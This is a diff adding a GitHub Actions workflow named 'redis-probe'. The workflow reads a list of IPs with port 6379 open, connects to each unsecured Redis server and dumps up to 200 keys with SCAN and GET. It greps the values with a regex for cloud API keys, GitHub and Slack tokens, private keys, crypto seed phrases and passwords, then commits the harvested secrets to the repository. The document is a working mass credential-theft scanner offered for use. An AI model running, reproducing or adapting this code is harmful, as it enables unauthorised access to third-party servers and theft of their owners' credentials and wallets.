@@ -1,0 +1,157 @@
+name: redis-probe
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 55
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: pull latest
+        run: git pull origin main || true
+
+      - name: install
+        run: pip install requests -q
+
+      - name: extract redis IPs from cumulative
+        run: |
+          grep ':6379' data/cumulative.txt | cut -d: -f1 | sort -u > redis_targets.txt
+          echo "Redis targets: $(wc -l < redis_targets.txt)"
+
+      - name: probe redis targets
+        run: |
+          cat > redis_probe.py << 'EOF'
+          import socket, json, re, sys
+          from concurrent.futures import ThreadPoolExecutor, as_completed
+
+          TIMEOUT = 5
+
+          KEY_RE = re.compile(
+              r'(AKIA[0-9A-Z]{16}'
+              r'|(?:sk|rk)-[a-zA-Z0-9]{20,}'
+              r'|sk-[a-zA-Z0-9]{32,}'
+              r'|ghp_[a-zA-Z0-9]{36}'
+              r'|gho_[a-zA-Z0-9]{36}'
+              r'|xox[baprs]-[0-9A-Za-z\-]{10,}'
+              r'|-----BEGIN [A-Z ]+ KEY-----'
+              r'|AIza[0-9A-Za-z\-_]{35}'
+              r'|[0-9]{9,10}:[A-Za-z0-9_\-]{35}'
+              r'|(?:0x[0-9a-fA-F]{64})'
+              r'|(?:private.?key|eth.?key|mnemonic|seed.?phrase)\s*[=:"\s]+([0-9a-fA-F]{64})'
+              r'|(?:password|passwd|secret|token|api.?key|private.?key|access.?key)\s*[=:]\s*["\']?([^\s"\'<>]{8,50}))',
+              re.IGNORECASE
+          )
+
+          def find_secrets(text):
+              return list(set(m.group(0)[:120] for m in KEY_RE.finditer(text)))
+
+          def parse_redis_keys(raw):
+              keys = []
+              lines = raw.split('\r\n')
+              i = 0
+              while i < len(lines):
+                  line = lines[i]
+                  if line.startswith('$') and i + 1 < len(lines):
+                      try:
+                          length = int(line[1:])
+                          if length > 0:
+                              keys.append(lines[i + 1])
+                          i += 2
+                      except:
+                          i += 1
+                  else:
+                      i += 1
+              return [k for k in keys if k and k != '0']
+
+          def probe(ip):
+              try:
+                  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                  s.settimeout(TIMEOUT)
+                  s.connect((ip, 6379))
+
+                  def send(*args):
+                      c = f'*{len(args)}\r\n' + ''.join(f'${len(str(a))}\r\n{a}\r\n' for a in args)
+                      s.send(c.encode())
+                      data = b''
+                      for _ in range(10):
+                          chunk = s.recv(65536)
+                          data += chunk
+                          if len(chunk) < 65536:
+                              break
+                      return data.decode('utf-8', errors='replace')
+
+                  pong = send('PING')
+                  if '+PONG' not in pong:
+                      s.close()
+                      return None
+
+                  keys_resp = send('SCAN', '0', 'COUNT', '300')
+                  keys = parse_redis_keys(keys_resp)
+
+                  secrets = []
+                  for key in keys[:200]:
+                      try:
+                          val = send('GET', key)
+                          found = find_secrets(f'{key}={val}')
+                          if found:
+                              secrets.extend(found[:5])
+                      except:
+                          pass
+
+                  s.close()
+                  if secrets or len(keys) > 0:
+                      return {'ip': ip, 'port': 6379, 'type': 'redis',
+                              'keys': len(keys), 'secrets': secrets}
+              except:
+                  pass
+              return None
+
+          with open('redis_targets.txt') as f:
+              targets = [l.strip() for l in f if l.strip()]
+
+          print(f'Probing {len(targets)} Redis targets...', flush=True)
+          findings = []
+          with ThreadPoolExecutor(max_workers=100) as ex:
+              futs = {ex.submit(probe, ip): ip for ip in targets}
+              for i, fut in enumerate(as_completed(futs)):
+                  try:
+                      r = fut.result()
+                      if r:
+                          findings.append(r)
+                          if r['secrets']:
+                              print(f'  HIT: {r["ip"]} keys={r["keys"]} secrets={len(r["secrets"])}', flush=True)
+                              for s in r['secrets'][:3]:
+                                  print(f'    -> {s[:80]}', flush=True)
+                  except:
+                      pass
+                  if i % 500 == 0:
+                      print(f'  progress: {i}/{len(targets)} done, {len(findings)} hits so far', flush=True)
+
+          print(f'\nTotal Redis hits: {len(findings)}')
+          print(f'With secrets: {sum(1 for f in findings if f["secrets"])}')
+
+          with open('redis_findings.jsonl', 'w') as f:
+              for r in findings:
+                  f.write(json.dumps(r) + '\n')
+          EOF
+          python3 redis_probe.py
+
+      - name: commit results
+        run: |
+          HITS=$(wc -l < redis_findings.jsonl 2>/dev/null || echo 0)
+          SECRETS=$(python3 -c "import json; data=[json.loads(l) for l in open('redis_findings.jsonl')]; print(sum(1 for d in data if d.get('secrets')))" 2>/dev/null || echo 0)
+
+          cat redis_findings.jsonl >> data/cumulative_findings.jsonl 2>/dev/null || true
+
+          git config user.email "scan@noreply"
+          git config user.name "scanner"
+          git add data/cumulative_findings.jsonl redis_findings.jsonl
+          git diff --cached --quiet || git commit -m "redis-probe: $HITS hits, $SECRETS with secrets"
+          git pull --rebase origin main || true
+          git push
